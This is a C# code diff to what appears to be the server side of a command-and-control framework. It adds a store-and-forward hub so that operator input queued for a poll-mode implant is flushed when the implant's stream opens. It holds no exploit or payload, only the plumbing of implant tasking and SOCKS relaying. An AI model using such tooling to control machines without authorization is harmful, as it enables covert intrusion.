@@ -50,6 +50,7 @@ internal sealed class BeaconSessionRunner
     private readonly TimeProvider _clock;
     private readonly ITaskDispatchWake _wake;
     private readonly LiveChannelHub _channels;
+    private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
     private readonly TaskRelayHub _relays;
     private readonly SocksProxyHub _socks;
     private readonly BeaconIngest _ingest;
@@ -61,6 +62,7 @@ internal sealed class BeaconSessionRunner
         TimeProvider clock,
         ITaskDispatchWake wake,
         LiveChannelHub channels,
+        Rod.Transport.Channels.DegradedChannelHub degraded,
         TaskRelayHub relays,
         SocksProxyHub socks,
         BeaconIngest ingest,
@@ -71,6 +73,7 @@ internal sealed class BeaconSessionRunner
         _clock = clock;
         _wake = wake;
         _channels = channels;
+        _degraded = degraded;
         _relays = relays;
         _socks = socks;
         _ingest = ingest;
@@ -111,6 +114,17 @@ internal sealed class BeaconSessionRunner
         // alone.
         var inputs = new BeaconChannelSink(_wake, session.Implant);
         using var attached = _channels.Attach(session.Implant, inputs);
+        // A poll-mode session (architecture.md Sec 10.3, the store-and-forward
+        // carriage): operator input that arrived while no stream was open
+        // parked in the degraded hub -- flush it onto this stream the moment
+        // it opens, the same drain the poll carriers' check-in paths apply,
+        // and sweep the channels the implant stopped collecting.
+        if (session.Capabilities.Contains(Rod.Transport.Channels.DegradedChannelHub.Capability))
+        {
+            await _degraded.SweepIdleAsync(linked.Token);
+            foreach (var frame in _degraded.Drain(session.Implant, int.MaxValue))
+                await write(frame, linked.Token);
+        }
         // This stream's ack-less dispatch ledger (architecture.md Sec 10.3 --
         // the dispatch strand on a dying stream): the writer adds each
         // dispatched task the handshake's receive-ack negotiation covers, the
